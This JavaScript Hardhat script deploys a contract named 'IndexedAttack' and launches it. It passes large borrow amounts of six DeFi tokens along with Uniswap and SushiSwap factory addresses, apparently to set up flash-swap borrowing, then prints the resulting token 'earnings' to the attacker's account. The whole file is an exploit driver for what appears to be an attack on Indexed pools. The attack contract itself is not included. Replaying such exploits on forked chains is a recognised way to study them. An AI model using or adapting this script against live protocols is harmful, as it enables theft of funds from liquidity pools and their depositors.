
const { WETH, UNI, AAVE, COMP, CRV, MKR, SNX, UNISWAP_V2_FACTORY, SUSHISWAP_V2_FACTORY } = require("./config")

async function getTokenBalance(token, signer) {
  contract = await ethers.getContractAt("IERC20", token.address, signer)
  const balance = await contract.balanceOf(signer.address)
  return ethers.utils.formatUnits(balance, token.decimals)
}

async function main() {
  const blockNumber = await ethers.provider.getBlockNumber()
  console.log('Block number: ', blockNumber)


  const UNI_BORROW_AMOUNT = ethers.FixedNumber.from(2000000, UNI.decimals)
  const AAVE_BORROW_AMOUNT = ethers.FixedNumber.from(200000, AAVE.decimals)
  const COMP_BORROW_AMOUNT = ethers.FixedNumber.from(41000, COMP.decimals)
  const CRV_BORROW_AMOUNT = ethers.FixedNumber.from(3211000, CRV.decimals)
  const MKR_BORROW_AMOUNT = ethers.FixedNumber.from(5800, MKR.decimals)
  const SNX_BORROW_AMOUNT = ethers.FixedNumber.from(453700, SNX.decimals)

  const [owner] = await ethers.getSigners()

  const IndexedAttack = await ethers.getContractFactory("IndexedAttack")
  const attack = await IndexedAttack.deploy()
  await attack.deployed()
  console.log('Deployed Indexed attack contract to: ', attack.address)

  const tx = await attack.start(
    [UNI.address, AAVE.address, COMP.address, CRV.address, MKR.address, SNX.address],
    [UNI_BORROW_AMOUNT, AAVE_BORROW_AMOUNT, COMP_BORROW_AMOUNT, CRV_BORROW_AMOUNT, MKR_BORROW_AMOUNT, SNX_BORROW_AMOUNT],
    [UNISWAP_V2_FACTORY, SUSHISWAP_V2_FACTORY, SUSHISWAP_V2_FACTORY, SUSHISWAP_V2_FACTORY, SUSHISWAP_V2_FACTORY, SUSHISWAP_V2_FACTORY]
  )

  console.log("You have earned: ")
  console.log(`WETH: ${await getTokenBalance(WETH, owner)}`)
  console.log(`UNI: ${await getTokenBalance(UNI, owner)}`)
  console.log(`AAVE: ${await getTokenBalance(AAVE, owner)}`)
  console.log(`COMP: ${await getTokenBalance(COMP, owner)}`)
  console.log(`CRV: ${await getTokenBalance(CRV, owner)}`)
  console.log(`MKR: ${await getTokenBalance(MKR, owner)}`)
  console.log(`SNX: ${await getTokenBalance(SNX, owner)}`)
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });